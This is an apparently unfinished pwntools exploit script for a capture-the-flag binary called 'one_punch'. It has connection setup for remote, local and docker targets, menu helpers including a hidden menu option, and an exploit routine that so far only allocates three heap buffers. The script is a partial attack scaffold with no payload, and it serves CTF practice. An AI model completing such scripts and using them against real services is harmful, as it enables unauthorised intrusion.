#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./one_punch"
LIBCNAME = "./libc.so.6"

hosts = ("","localhost","localhost")
ports = (0,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge(idx):
  c.recvuntil("> ")
  c.sendline(str(idx))

def debut(idx,name):
  hoge(1)
  c.recvuntil("idx: ")
  c.sendline(str(idx))
  c.recvuntil("name: ")
  c.send(name)
  if "poor" in c.recv(4):
    print("[*] name should be 0x80~0x400")

def onepunch():
  hoge(50056)



## exploit ###########################################

def exploit():
  global c
  
  debut(0,"B"*0x200)
  debut(1,"C"*0x200)
  debut(2,"D"*0x200)


## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
